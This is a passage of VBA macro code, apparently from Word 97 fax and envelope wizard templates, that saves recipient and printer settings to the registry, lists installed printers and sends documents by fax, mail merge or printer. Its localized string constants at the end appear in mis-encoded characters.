            ElseIf iLastName = -1 Then
                iLastName = i - 1
            End If
        ElseIf InStr(rgstrNames(i - 1), strFLD_FAX) Then
            If iFax = -1 Then iFax = i - 1
        End If
        
    Next i
    
    formWizard.cboFldsRcpntFirstName.List = rgstrNames
    formWizard.cboFldsRcpntLastName.List = rgstrNames
    formWizard.cboFldsFaxNum.List = rgstrNames
    
    formWizard.cboFldsRcpntFirstName.AddItem strNONE
    formWizard.cboFldsRcpntLastName.AddItem strNONE
    
    If (iFirstName <> -1) Then
        formWizard.cboFldsRcpntFirstName.Value = rgstrNames(iFirstName)
    Else
        formWizard.cboFldsRcpntFirstName.Value = strNONE
    End If
        
    If (iLastName <> -1) Then
        formWizard.cboFldsRcpntLastName.Value = rgstrNames(iLastName)
    Else
        formWizard.cboFldsRcpntLastName.Value = strNONE
    End If
        
    If (iFax <> -1) Then _
        formWizard.cboFldsFaxNum.Value = rgstrNames(iFax)

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'retrieves the Names and numbers stored in registry.
Sub ReadRegistryFaxNames(fDummy As Boolean)
Dim j As Integer, k As Integer
Dim objCtrls As Object
    On Error GoTo FatalError
    fRegistryNamesRead = True
    Set objCtrls = formWizard.mpgWizardPage.Pages(iPANEL_RCPNTS).Controls
    
    For j = 1 To iMAX_RCPNTS
        rgstrMRUFaxNames(j - 1) = StrRestorePref(strRCPNT_NAME & j, "")
        rgstrMRUFaxNums(j - 1) = StrRestorePref(strRCPNT_NUMBER & j, "")
    Next j
        
    
    For j = 0 To iMAX_RCPNTS - 1
        objCtrls(strCBO_RCPNT_NAME & j).List = rgstrMRUFaxNames
        objCtrls(strCBO_RCPNT_NUM & j).List = rgstrMRUFaxNums
    Next j
    
    Exit Sub
    
FatalError:
    ReportError Err
End Sub
Sub SaveDialogValues(fDummy As Boolean)
    On Error GoTo FatalError
    
    StatusBar = strSAVE_SETTINGS
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    System.PrivateProfileString("", strREG_SETTINGS_BASE_KEY, strREG_ASSISTANT_TIME_STAMP) = Format$(Now, "General Date")
    StoreValPref strREG_ASSISTANT_HELP, iLocalState
    
    StorePref "Fax Option", CStr(iFaxOption)
    If iFaxOption = iDIFF_FAX Then _
        StorePref "Fax Driver", formWizard.cboFaxDriver.Text
    
    StorePref "Sender Fax", formWizard.txtSenderFax.Text
    StorePref "Sender Phone", formWizard.txtSenderPhone.Text
    StorePref "Coversheet Style", CStr(iFaxStyle)
    
    If Not (fDocIsFormLtr) Then SaveRcpntsInRegistry
    
    fSettingsSaved = True
    System.Cursor = wdCursorNormal
    StatusBar = ""
    Application.ScreenUpdating = True

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'stores the recipient names and numbers of iMAX_RCPNTS recipients.
'The name is tagged to the number. So, you can have a number without a name
'but not a name without a number
Private Sub SaveRcpntsInRegistry()
'Dim strName As String
Dim strNum As String
Dim i As Integer, j As Integer, k As Integer
Dim objCtrls As Object

    On Error GoTo FatalError
    k = 0
    'initialize the arrays so that even if the user has not
    'chosen any recipient we can still use the first entry of the arrays.
    rgstrRcpntFaxNames(0) = ""
    rgstrRcpntFaxNums(0) = ""
    iNumRcpnts = 0
    
    Set objCtrls = formWizard.mpgWizardPage.Pages(iPANEL_RCPNTS).Controls
    
    For i = 0 To iMAX_RCPNTS - 1
        strNum = StrSearchReplace(objCtrls(strCBO_RCPNT_NUM & i).Text, vbTab, " ") 'recipient number
        If (Len(strNum)) Then 'if number not empty
            rgstrRcpntFaxNums(k) = strNum 'store number
            rgstrRcpntFaxNames(k) = StrSearchReplace(objCtrls(strCBO_RCPNT_NAME & i).Text, vbTab, " ") 'and corresponding name
            k = k + 1
            StorePref strRCPNT_NUMBER & k, strNum 'store number
            StorePref strRCPNT_NAME & k, rgstrRcpntFaxNames(k - 1)
 
            j = objCtrls(strCBO_RCPNT_NUM & i).ListIndex
            
            'user selected one of the choices
            If j <> -1 Then rgstrMRUFaxNums(j) = ""  'already picked up this text
        End If
    Next i
    
    iNumRcpnts = k
    
    j = 0
    While (k < iMAX_RCPNTS) 'if we haven't yet iMAX_RCPNTS names
        'go through the array of orginally obtained recipients and
        'store which haven't yet been stored
        While ((j < iMAX_RCPNTS) And (Len(rgstrMRUFaxNums(j)) = 0))
            j = j + 1
        Wend
        
        If j = iMAX_RCPNTS Then
            GoTo LReturn 'no names left to fill
        Else
            k = k + 1
            StorePref strRCPNT_NAME & k, rgstrMRUFaxNames(j) 'store name
            StorePref strRCPNT_NUMBER & k, rgstrMRUFaxNums(j) 'and corresponding number
            rgstrMRUFaxNums(j) = ""
        End If
    Wend

LReturn:
    Exit Sub
FatalError:
    ReportError Err
End Sub

'Error will be taken care of in SetupDocForFax
'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub SaveRcpntsInDocVars(fSaveRcpnts As Boolean)
Dim i As Integer
Dim objVars As Variables
Dim strTemp As String, strFaxFld As String

    Set objVars = ActiveDocument.Variables
    objVars.Add strNUM_RCPNTS, iNumRcpnts
    
    If fSaveRcpnts Then
        If (iNumRcpnts > 0) Then
            For i = 1 To iNumRcpnts
                objVars.Add strRCPNT_NAME & i, rgstrRcpntFaxNames(i - 1)
                objVars.Add strRCPNT_NUMBER & i, rgstrRcpntFaxNums(i - 1)
            Next i
        End If
    End If
    
    If (fNoCovSht) Then
        objVars.Add "Cover Sheet Present", "0"
    Else
        objVars.Add "Cover Sheet Present", "1"
    End If
    
    strFaxFld = " "
    'store what fax option user chose.
    If (iFaxOption = iDIFF_FAX) Then
        objVars.Add "MS Fax Present", "0"
        objVars.Add "Fax Printer", formWizard.cboFaxDriver.Text
    Else
        objVars.Add "MS Fax Present", "1"
        If fDocIsFormLtr Then
            strFaxFld = formWizard.cboFldsFaxNum.Value
        Else
            strFaxFld = strFLD_FAX_NUMBER
        End If
    End If
    
    objVars.Add "Fax Field Name", strFaxFld

    'if doc. is present and is to be faxed then store relevant info. about doc.
    If (fDocPresent And (Not (formWizard.optCovSht.Value))) Then
        objVars.Add "Main Doc Present", "1"
        objVars.Add "Main Document Name", objMainDoc.Name
        
        'is the field a fax number or an Address Book Entry???
        If (fDocIsFormLtr) Then objVars.Add "Through Email", _
                formWizard.optFldFaxEntry.Value

    Else
        
        objVars.Add "Main Doc Present", "0"
    
    End If
    
End Sub


'removes vbCR & vbLF from the end of the string
'until the last character is not a vbLf or vbCr
Public Function StrRemoveCrLfFromEnd(strText As String) As String
    Dim strChar As String
    Dim i As Integer

    i = Len(strText)
    If (i = 0) Then GoTo LEnd

    strChar = Mid$(strText, i, 1)
    'check for the last character
    While (strChar = vbLf) Or (strChar = vbCr)
        i = i - 1
        strChar = Mid$(strText, i, 1)
    Wend
    
LEnd:
    StrRemoveCrLfFromEnd = Left$(strText, i)
End Function
'counts the number of lines in a string
Public Function ICountLines(ByVal strWhat As String, strNewText As String, iMax As Integer) As Integer
    Dim cLines As Integer, iPos As Integer
    
    strNewText = ""
    cLines = 0
    iPos = InStr(strWhat, vbCr)
    While iPos
        If iPos < Len(strWhat) Then
            If cLines < iMax Then strNewText = strNewText & Left$(strWhat, iPos - 1)
            cLines = cLines + 1
            strWhat = Mid$(strWhat, iPos + 1)
            iPos = InStr(strWhat, vbCr)
        Else
            If cLines < iMax Then strNewText = strNewText & Left$(strWhat, iPos - 1)
            If Len(strWhat) > 1 Then cLines = cLines + 1
            strWhat = ""
            iPos = 0
        End If
    Wend
    If strWhat <> "" Then
        If cLines < iMax Then strNewText = strNewText & strWhat
        cLines = cLines + 1
    End If
    
    ICountLines = cLines

End Function  ' CountLines

'inserts a field of type iFldType at the given range with strText as the text. Field replaces the text in objRng
'so pass a collapsed range always.and updates the range to be at the end
'of the inserted field.
Private Sub InsertField(objRng As Range, iFldType, strText As String, fPreserveFormatting)
    Dim objFld As Field
    
    On Error GoTo FatalError

    Set objFld = objRng.Fields.Add(objRng, iFldType, strText, fPreserveFormatting)
    
    Set objRng = objFld.result
    With objRng
        .Collapse wdCollapseEnd
        .End = .End + 1
        .Start = .End
    End With
    
    Exit Sub
FatalError:
    ReportError Err
    
End Sub
'replaces all occurences of vbCR & vbLF with the delimiter string in strText
'returns the new string
Private Function StrReplaceCrLfWithText(strText As String, strDelim As String) As String
    Dim strRet As String, strTmp As String
    
    strRet = ""
    strTmp = strText
    If Len(strTmp) = 0 Then GoTo LEnd
    
    strRet = StrRemoveCrLfFromEnd(strTmp)
    'remove vbLf thro' search and replace
    strTmp = StrSearchReplace(strRet, vbLf, "")
    'now replace all occurrences of vbCr with strDelim
    strRet = StrSearchReplace(strTmp, vbCr, strDelim)
LEnd:
    StrReplaceCrLfWithText = strRet

End Function

'removes the character strSrch from strText.
'caller should make sure that strSrch is a one character string
'returns the string stripped off the character
Private Function StrSearchReplace(strText As String, strSrch As String, strReplace As String)
    Dim strRet As String, strTmp As String
    Dim iPos As Integer
    
    strRet = ""
    strTmp = strText

    iPos = InStr(strTmp, strSrch)
    
    While (iPos) 'presence of strChar
        strRet = strRet & Left$(strTmp, iPos - 1)
        If (iPos < Len(strTmp)) Then
            strRet = strRet & strReplace
            strTmp = Mid$(strTmp, iPos + 1)
            iPos = InStr(strTmp, strSrch)
        Else 'strSrch is the last character
            strTmp = ""
            iPos = 0
        End If
    Wend
        
    'append whatever is left of the original string
    strRet = strRet & strTmp

    StrSearchReplace = strRet
End Function

'Errors in SaveRcpntsInDocVars & CreateCmdBar gets propagated back
'this function
Public Sub SetupDocForFax(fDummy As Boolean)
    On Error GoTo FatalError

    If iFaxOption = iNO_FAX Then Exit Sub

    If (Not (fDocIsFormLtr)) And (iNumRcpnts = 0) And (iFaxOption = iMS_FAX) _
            Then Exit Sub
        
    'dont save recipient info for form letter
    SaveRcpntsInDocVars (Not (fDocIsFormLtr))
    
    If (fNoCovSht) Then 'fax the doc.
        If (Not (fDocIsFormLtr)) Then
            FaxRegDoc
        Else
            FaxFormLtr
        End If
    Else
        CreateCmdBar
    End If

    Exit Sub
FatalError:
    DisplayErrorMsg strERR_CREATING_CMDBAR
    ReportError Err
End Sub
'Error will be taken care of in SetupDocForFax
Private Sub CreateCmdBar()
Dim objCmdBar As CommandBar
Dim objBtn As CommandBarButton

    Application.CustomizationContext = ActiveDocument
    Set objCmdBar = Application.CommandBars.Add(strCMD_BAR_TITLE, Position:=msoBarFloating, Temporary:=True)

    'Add a button
    Set objBtn = objCmdBar.Controls.Add(msoControlButton, Temporary:=True)
    objBtn.Style = msoButtonCaption
    objBtn.Caption = strCMD_BTN_TEXT
    
    If (Not (fDocIsFormLtr)) Then
        objBtn.OnAction = "Fax.FaxRegDoc"
    Else
        objBtn.OnAction = "Fax.FaxFormLtr"
    End If
    
    objCmdBar.Visible = True
    
    fCreatedCmdBar = True
    Exit Sub

End Sub

'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub FaxRegDoc()

Dim fMSFax As Boolean
Dim fCovSht As Boolean
Dim iNumRcpnts As Integer
Dim rgstrFaxNames(iMAX_RCPNTS) As String
Dim rgstrFaxNums(iMAX_RCPNTS) As String
Dim i As Integer
Dim strDocName As String
Dim objVars As Variables
Dim fMainDocPresent As Integer
Dim strErrorMsg As String
Dim strFaxPrinter As String, strActivePrinter As String
Dim objTmpMM As MailMerge, strFaxFld As String
Dim fSendMailAttach As Boolean


    On Error GoTo FatalError
    strErrorMsg = strERR_SEND_FAX
    fSendMailAttach = Application.Options.SendMailAttach
    
    Set objVars = ActiveDocument.Variables
    
    iNumRcpnts = Val(objVars(strNUM_RCPNTS).Value)
    
    fCovSht = Val(objVars("Cover Sheet Present").Value)
    fMSFax = Val(objVars("MS Fax Present").Value)
    fMainDocPresent = Val(objVars("Main Doc Present").Value)
    strFaxFld = objVars("Fax Field Name").Value
    
    If fMainDocPresent Then
        'obtain handle to main document
        strDocName = objVars("Main Document Name").Value
        If FInvalidMainDoc(objMainDoc, strDocName) Then Exit Sub
        'Set objMainDoc = Application.Documents(strDocName)
    End If
          
    For i = 1 To iNumRcpnts
        rgstrFaxNames(i - 1) = objVars(strRCPNT_NAME & i).Value
        rgstrFaxNums(i - 1) = objVars(strRCPNT_NUMBER & i).Value
    Next i
    
    'if nonMSFax, then set the Fax driver to be the current printer
    If (Not (fMSFax)) Then
        strActivePrinter = Application.ActivePrinter
        strFaxPrinter = objVars("Fax Printer").Value
        If Len(strFaxPrinter) = 0 Then strFaxPrinter = " "
        Application.ActivePrinter = strFaxPrinter
     End If
    
    'fax the cover sheet first
    If (fCovSht) Then
        If (iNumRcpnts > 1) Then
            Set objTmpMM = ActiveDocument.MailMerge
            If fMSFax Then
                objTmpMM.Destination = wdSendToFax
                'MsgBox "MailMerging the cover sheet"
            Else 'non MS fax
                objTmpMM.Destination = wdSendToPrinter
            End If
            objTmpMM.MailAsAttachment = True
            objTmpMM.MailAddressFieldName = strFaxFld
            StatusBar = strFAXING_CS_RECIPIENTS
            objTmpMM.Execute
            
        ElseIf (iNumRcpnts = 1) And fMSFax Then
            StatusBar = strFAXING_CS_TO & " " & rgstrFaxNums(0) & "..."
            Application.Options.SendMailAttach = True
            ActiveDocument.SendFax rgstrFaxNums(0)
                'MsgBox "Faxing to  " & rgstrFaxNames(0) & rgstrFaxNums(0)
        Else 'non MS fax
            StatusBar = strFAXING_CS_RECIPIENT & "..."
            ActiveDocument.PrintOut
        End If
    End If
    
    If fMainDocPresent = 0 Then GoTo LResetPrinter 'if no main doc. then deesh
    
    If (iNumRcpnts = 0) And Not (fMSFax) Then objMainDoc.PrintOut
    
    'send the main doc.
    If fMSFax Then Application.Options.SendMailAttach = True
    For i = 0 To iNumRcpnts - 1
        If fMSFax Then
            StatusBar = strFAXING_DOC_TO & " " & rgstrFaxNums(i)
            objMainDoc.SendFax rgstrFaxNums(i)
            'MsgBox "Faxing to  " & rgstrFaxNames(i) & rgstrFaxNums(i)
        Else
            StatusBar = strFAXING_DOC_RECIPIENT & " " & CStr(i + 1) & "..."
            objMainDoc.PrintOut
        End If
        
    Next i
    
LResetPrinter:
'reset printer for non MS fax
    If fMSFax Then
        Application.Options.SendMailAttach = fSendMailAttach
    Else
        Application.ActivePrinter = strActivePrinter
    End If
    DisplayPostWizTip strMSG_FAX_SUCCESS, True
    'DeleteCmdBar strCMD_BAR_TITLE
    Exit Sub
    
FatalError:
    i = Err.Number
    If i Then strErrorMsg = strErrorMsg & vbCr & Err.Description
    'if Fax not installed error message
    If i = iERR_FAX_NOT_INSTALLED Then _
        strErrorMsg = strErrorMsg & vbCr & strHLP_FAX_INSTALL
    DisplayTip strErrorMsg
'reset printer for non MS fax
    If fMSFax Then
        Application.Options.SendMailAttach = fSendMailAttach
    Else
        Application.ActivePrinter = strActivePrinter
    End If
    
    If i = iERR_FAX_NOT_INSTALLED Then
        DisplayHelp strWIN_HELP_FILE, lCNTXT_FAX_INSTALL
    ElseIf i = iERR_FAX_NOT_SENT And fMSFax Then
        DisplayHelp strFAX_HELP_FILE, lCNTXT_FAX_SEND
    End If
End Sub
'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub FaxFormLtr()

Dim fMSFax As Boolean
Dim fCovSht As Boolean
Dim i As Integer
Dim strDocName As String
Dim iDestination As Long
Dim objVars As Variables
Dim fMainDocPresent As Integer
Dim strErrorMsg As String
Dim strFaxPrinter As String, strActivePrinter As String
Dim objTmpMM As MailMerge, strFaxFld As String

    On Error GoTo FatalError

    strErrorMsg = strERR_SEND_FAX
    Set objVars = ActiveDocument.Variables

    fCovSht = Val(objVars("Cover Sheet Present").Value)
    fMSFax = Val(objVars("MS Fax Present").Value)
    fMainDocPresent = Val(objVars("Main Doc Present").Value)
    strFaxFld = objVars("Fax Field Name").Value
    
    If fMainDocPresent Then
        'obtain handle to main document
        strDocName = objVars("Main Document Name").Value
        If FInvalidMainDoc(objMainDoc, strDocName) Then Exit Sub
        'Set objMainDoc = Application.Documents(strDocName)
    End If
    
    If fMSFax Then
        If Val(objVars("Through Email").Value) Then
            iDestination = wdSendToEmail
        Else
            iDestination = wdSendToFax
        End If
    Else
        iDestination = wdSendToPrinter
        'if nonMSFax, then set the Fax driver to be the current printer
        strActivePrinter = Application.ActivePrinter
        strFaxPrinter = objVars("Fax Printer").Value
        If Len(strFaxPrinter) = 0 Then strFaxPrinter = " "
        Application.ActivePrinter = strFaxPrinter
    End If
    
    'send the coversheet first
    If (fCovSht) Then
        Set objTmpMM = ActiveDocument.MailMerge
        objTmpMM.Destination = iDestination 'MsgBox "MailMerging activdoc (coversheet) "
        objTmpMM.MailAddressFieldName = strFaxFld
        objTmpMM.MailAsAttachment = True
        StatusBar = strFAXING_CS_RECIPIENTS
        objTmpMM.Execute
    End If
 
    If fMainDocPresent = 0 Then GoTo LResetPrinter
    
    'fax the main document
    Set objTmpMM = objMainDoc.MailMerge
    objTmpMM.Destination = iDestination
    objTmpMM.MailAddressFieldName = strFaxFld
    objTmpMM.MailAsAttachment = True
    StatusBar = strFAXING_DOC_RECIPIENTS
    objTmpMM.Execute
    'MsgBox "MailMerging main doc."

LResetPrinter:
'reset printer for non MS fax
    ActiveDocument.Fields.Update
    If (Not (fMSFax)) Then Application.ActivePrinter = strActivePrinter
    DisplayPostWizTip strMSG_FAX_SUCCESS, True
    'DeleteCmdBar strCMD_BAR_TITLE
    Exit Sub
    
FatalError:
    i = Err.Number
    If i Then strErrorMsg = strErrorMsg & vbCr & Err.Description
    'if Fax not installed error message
    If i = iERR_FAX_NOT_INSTALLED Then _
        strErrorMsg = strErrorMsg & vbCr & strHLP_FAX_INSTALL
        
    DisplayTip strErrorMsg
    
'reset printer for non MS fax
    If (Not (fMSFax)) Then Application.ActivePrinter = strActivePrinter
    
    If i = iERR_FAX_NOT_INSTALLED Then
        DisplayHelp strWIN_HELP_FILE, lCNTXT_FAX_INSTALL
    ElseIf i = iERR_FAX_NOT_SENT And fMSFax Then
        DisplayHelp strFAX_HELP_FILE, lCNTXT_FAX_SEND
    End If
End Sub

'To display help using help files. Assuming that the help files are present in
'the windows directory
Private Sub DisplayHelp(strFile As String, ByVal lContext As Long)
    Dim iSize As Integer
    Dim strTmpBuffer As String
    Dim j As Integer, i As Integer
    Dim strWinDir As String, strWndName As String
    Dim hOpusWin As Long, lResult As Long
    Dim strMacroName As String
    
    'Get windows directory
    i = 512
    strTmpBuffer = String$(i, 0)
    j = 0
    strWinDir = ""
    j = GetWindowsDirectory(strTmpBuffer, i)
    
    If j Then
        If (j > i) Then j = i
        
        strWinDir = Left$(strTmpBuffer, j)
        If Right$(strWinDir, 1) <> strPathSeparator Then _
            strWinDir = strWinDir & strPathSeparator
    End If
    
    'Find word's window
    strWndName = strMS_WORD
    If ActiveWindow.WindowState = wdWindowStateMaximize Then _
        strWndName = strWndName & " - " & ActiveWindow.Caption
    hOpusWin = FindWindow("OpusApp", strWndName)
    If hOpusWin = 0 Then GoTo LNotFindWindow
    
    'display help
    strMacroName = "JH(" & strQUOTE & strQUOTE & " , " & lContext & ")"
    lResult = WinHelp(hOpusWin, strWinDir & strFile, HELP_COMMAND, strMacroName)
    
LNotFindWindow:
End Sub
'displays a tip during post-wizard options
'assumes that Assistant is present since it is called from post-wizard balloon
Private Sub DisplayTip(strTip As String)
    Dim objBlnTip As Balloon
    On Error GoTo FatalError
    
    Set objBlnTip = Assistant.NewBalloon
    
    With objBlnTip
        .Mode = msoModeModal
        .Heading = strWizName
        .Text = strTip
        .Button = msoButtonSetOK
    End With
    objBlnTip.Show
    
    If Assistant.BalloonError <> msoBalloonErrorNone Then GoTo FatalError

    Exit Sub

FatalError:
    Err.Clear
    'MsgBox strTip, vbOKOnly + vbApplicationModal, strWizName
End Sub
'ROUTINES TO OBTAIN PRINTERS FROM REGISTRY
'fills rgstrPrinterNames with the local and remote printer names obtained
'from the registry. iTotalNumPrinters has the number of printer
'names obtained.
Sub GetAllPrinters()
Dim i As Integer

    iTotalNumPrinters = 0
    
    GetLocalPrinters
    GetRemotePrinters
    
    If (iTotalNumPrinters > 0) Then
        ReDim Preserve rgstrPrinterNames(iTotalNumPrinters - 1)
        formWizard.cboFaxDriver.List = rgstrPrinterNames
        formWizard.cboFaxDriver.ListIndex = 0
    End If
    'if no printers, then the user can use cmdOtherPrinters to select one
    'if we failed to enumerate some printer
    
End Sub
Sub GetRemotePrinters()
    Dim hr As Long
    Dim hSubKey As Long

    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_PROVIDERS, hSubKey)
    If hr <> ERROR_SUCCESS Then Exit Sub
    
    GetRemotePrinterNames (hSubKey)

    RegCloseKey (hSubKey)
    
End Sub

Sub GetProviderPrinters(strProvider As String)
Dim hr As Long
Dim hKeyProviderServers As Long
Dim lpPrinterServer As String, strPrinterServer As String
Dim cbPrinterServer As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterServer As Integer

    cbPrinterServer = 256
    lpPrinterServer = String$(cbPrinterServer, 0)
    dwPrinterIndex = 0


    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_PROVIDERS & strProvider & "\Servers", hKeyProviderServers)

    If hr <> ERROR_SUCCESS Then GoTo LEndGetProviderPrinters
            
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterServer = String$(cbPrinterServer, 0)
        
        hr = RegEnumKey(hKeyProviderServers, dwPrinterIndex, lpPrinterServer, cbPrinterServer)
        
        If hr <> ERROR_SUCCESS Then GoTo LCloseProviderServersKey
        
        iLenPrinterServer = InStr(lpPrinterServer, Chr$(0))
        If (iLenPrinterServer > 1) Then 'no name
            strPrinterServer = Left$(lpPrinterServer, iLenPrinterServer - 1)
            GetPrinterNamesFromServer strProvider, strPrinterServer
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
LCloseProviderServersKey:
    RegCloseKey (hKeyProviderServers)
    
LEndGetProviderPrinters:
End Sub

Sub GetPrinterNamesFromServer(strProvider As String, strPrinterServer As String)
Dim hr As Long
Dim hKeyPrinterServers As Long
Dim lpPrinterName As String, strPrinterName As String
Dim strPrinter As String
Dim cbPrinterName As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterName As Integer
Dim strRegPrinterServers As String


    cbPrinterName = 256
    lpPrinterName = String$(cbPrinterName, 0)
    dwPrinterIndex = 0

    On Error Resume Next
    strRegPrinterServers = strREG_PROVIDERS & strProvider & "\Servers\" & strPrinterServer & "\Printers"
    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strRegPrinterServers, hKeyPrinterServers)

    If hr <> ERROR_SUCCESS Then GoTo LEndGetProviderPrinters
            
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterName = String$(cbPrinterName, 0)
        
        lRet = RegEnumKey(hKeyPrinterServers, dwPrinterIndex, lpPrinterName, cbPrinterName)
        
        If lRet <> ERROR_SUCCESS Then GoTo LClosePrinterServersKey
        
        iLenPrinterName = InStr(lpPrinterName, Chr$(0))
        If (iLenPrinterName > 1) Then 'no name
            strPrinter = Left$(lpPrinterName, iLenPrinterName - 1)
            strPrinterName = ""
            strPrinterName = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\" & strRegPrinterServers & "\" & strPrinter, "Name")
            
            If Len(strPrinterName) <> 0 Then
                If (iTotalNumPrinters Mod 10) = 0 Then _
                    ReDim Preserve rgstrPrinterNames(iTotalNumPrinters + 10)
                rgstrPrinterNames(iTotalNumPrinters) = UCase$("\\" & strPrinterServer & "\" & strPrinterName)
                iTotalNumPrinters = iTotalNumPrinters + 1
            End If
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
LClosePrinterServersKey:
    RegCloseKey (hKeyPrinterServers)
    
LEndGetProviderPrinters:

End Sub

Sub GetRemotePrinterNames(hKey As Long)
    Dim dwProviderIndex As Long
    Dim cbProviderName As Long
    Dim lpProviderName As String
    Dim lRet As Long, iLenProviderName  As Integer

    Dim strProviderName As String
  
    cbProviderName = 256
    dwProviderIndex = 0

    lRet = ERROR_SUCCESS
    
    'get the list of providers and call GetProviderPrinters for each provider
    While (lRet = ERROR_SUCCESS)
        lpProviderName = String$(cbProviderName, 0)
        
        lRet = RegEnumKey(hKey, dwProviderIndex, lpProviderName, cbProviderName)
        
        If (lRet <> ERROR_SUCCESS) Then GoTo LEnd
        
        iLenProviderName = InStr(lpProviderName, Chr$(0)) 'length of provider name
        
        If (iLenProviderName > 1) Then
            strProviderName = Left$(lpProviderName, iLenProviderName - 1)
            GetProviderPrinters (strProviderName)
        End If

        dwProviderIndex = dwProviderIndex + 1
    Wend
    
LEnd:

End Sub

Sub GetLocalPrinters()
    Dim hr As Long
    Dim hSubKey As Long

    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_LOCAL_PRINTERS, hSubKey)
    If hr <> ERROR_SUCCESS Then Exit Sub

    GetLocalPrinterNames (hSubKey)

    RegCloseKey (hSubKey)
    
End Sub

Sub GetLocalPrinterNames(hKey As Long)

Dim lpPrinterName As String, strPrinterName As String
Dim strPrinter As String
Dim cbPrinterName As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterName As Integer

    cbPrinterName = 256
    dwPrinterIndex = 0

    On Error Resume Next
    
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterName = String$(cbPrinterName, 0)
        
        lRet = RegEnumKey(hKey, dwPrinterIndex, lpPrinterName, cbPrinterName)
        
        If lRet <> ERROR_SUCCESS Then GoTo LEndLocalPrinters
        
        iLenPrinterName = InStr(lpPrinterName, Chr$(0))
        If (iLenPrinterName > 1) Then 'no name
            strPrinter = Left$(lpPrinterName, iLenPrinterName - 1)
            strPrinterName = ""
            strPrinterName = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\" & strREG_LOCAL_PRINTERS & strPrinter, "Name")
            
            If Len(strPrinterName) <> 0 Then 'if valid name, add to list
                If (iTotalNumPrinters Mod 10) = 0 Then _
                    ReDim Preserve rgstrPrinterNames(iTotalNumPrinters + 10)
                
                rgstrPrinterNames(iTotalNumPrinters) = UCase$(strPrinterName)
                
                iTotalNumPrinters = iTotalNumPrinters + 1
            End If
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
    
LEndLocalPrinters:
End Sub

'displays post wizard tip in an autodown balloon if Assistant is visible
Public Sub DisplayPostWizTip(strTip As String, fMsgBox As Boolean)

    Dim objTipBalloon As Balloon

    On Error GoTo TipError
    If fMsgBox Then
        If Assistant.Visible = False Then GoTo TipError
    End If
    Set objTipBalloon = Assistant.NewBalloon
    With objTipBalloon
        .Mode = msoModeAutoDown
        .Heading = strWizName
        .Button = msoButtonSetNone
        .Text = strTip
    End With
    objTipBalloon.Show

    If Assistant.BalloonError <> msoBalloonErrorNone Then GoTo TipError
    
TipError:
    Err.Clear
    If fMsgBox Then MsgBox strTip, vbInformation + vbOKOnly + vbApplicationModal, strWizName
End Sub

Private Function FInvalidMainDoc(objMainDoc As Document, strDocName As String) As Boolean
    On Error GoTo NoDoc
    Set objMainDoc = Application.Documents(strDocName)
    FInvalidMainDoc = False
    Exit Function
NoDoc:
    DisplayErrorMsg strERR_NO_MAIN_DOC1 & strDocName & strERR_NO_MAIN_DOC2
    FInvalidMainDoc = True
End Function

Public Sub DeleteCmdBar(strCmdBarName)
    On Error Resume Next
    Application.CommandBars(strCmdBarName).Delete
    Err.Clear
End Sub


Function GetCurFont(rgn As Range) As Font
    On Error GoTo LError
    If (rgn.Font.Size = 9999999) Then
        If (rgn.Characters(1).Font.Size = 9999999) Then
            Set GetCurFont = ActiveDocument.Styles(rgn.Paragraphs(1).Style).Font
        Else
            Set GetCurFont = rgn.Characters(1).Font
        End If
    Else
        Set GetCurFont = rgn.Font
    End If
    Exit Function
LError:
    MsgBox Err.Description
End Function

'returns the value stored in registry key strId
Public Function StrFetchPref(strId As String) As String
    On Error GoTo LReturnNull
    
    StrFetchPref = System.PrivateProfileString("", strRegSettingsKey, strId)
    Exit Function
LReturnNull:
    StrFetchPref = ""
End Function

'returns the string stored in strId. If empty, returns strDefault
Public Function StrRestorePref(strId As String, strDefault As String) As String
    Dim strTemp As String

    strTemp = StrFetchPref(strId)
    ' If length is 0, it wasn't in regsistry, so use default value
    If Len(strTemp) = 0 Then
        strTemp = strDefault
    ' "~" is a placeholder to allow returning empty strings
    ElseIf strTemp = "~" Then
        strTemp = ""
    End If
    
    StrRestorePref = strTemp
End Function

' --------------------------------------------------------------------------------------
' WORD 97 MINI-WIZARD
' Envelope Wizard Specific Code
' --------------------------------------------------------------------------------------

Option Explicit

' --------------------------------------------------------------------------------------
' DECLARATIONS
' --------------------------------------------------------------------------------------

Public Const strWIZ_NAME = "«H«ÊºëÆF"
Public Const iBALLOON_OPTIONS = 2 ' Number of items in InitialBalloon (First=1)
Public Const strBALLOON_HEADING = "Åwªï¨Ï¥Î«H«ÊºëÆF¡C"
Public Const strOPTION_ONE_ACCELERATOR = "C"   'This is the form accelerator for strInitialBalloon(0)
Public Const strOPTION_TWO_ACCELERATOR = "e"   'This is the form accelerator for strInitialBalloon(1)
Public strInitialBalloon(iBALLOON_OPTIONS) As String
Public strHelpTip(iBALLOON_OPTIONS) As String

Public Sub InitWizardStrings()
  
' NOTE: change constant  iBALLOON_OPTIONS if number of items in list changes
    ' Balloon / Form menu options
    strInitialBalloon(0) = "«Ø¥ß¤@«H«Ê"
    strInitialBalloon(1) = "«Ø¥ß¶l±H²M³æ¤¤ªº©Ò¦³«H«Ê"

    ' Assistant help messages
